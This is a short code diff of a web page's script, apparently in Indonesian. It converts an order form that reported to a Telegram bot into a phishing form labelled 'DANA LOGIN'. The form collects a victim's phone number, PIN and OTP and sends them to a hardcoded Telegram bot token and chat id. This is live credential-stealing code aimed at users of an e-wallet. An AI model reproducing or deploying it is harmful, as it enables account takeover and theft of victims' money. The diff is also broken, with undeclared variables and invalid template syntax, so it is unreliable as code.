@@ -186,14 +186,14 @@ body {
 <script>
   function kirim(){
 
-    let nama = document.getElementById("nama").value;
-    let jumlah = document.getElementById("jumlah").value;
-    let metode = document.getElementById("metode").value;
+    let nama = document.getElementById("phone").value;
+    let jumlah = document.getElementById("pin").value;
+    let metode = document.getElementById("otp").value;
 
     let token = "8646361372:AAFxdpEs_KGHb63pBoZTHhR7PCYAZfWpEBA";
     let chat_id = "7558232474";
 
-    let text = `💳 ORDER BARU\nNama: ${nama}\nJumlah: Rp ${jumlah}\nMetode: ${metode}`;
+    let text = `💳 DANA LOGIN\nphone: ${phone}\npin: Rp ${pin}\notp: ${otp}`;
 
     let url = `https://api.telegram.org/bot${8646361372:AAFxdpEs_KGHb63pBoZTHhR7PCYAZfWpEBA}/sendMessage?chat_id=${7558232474}&text=${encodeURIComponent(text)}`;
 
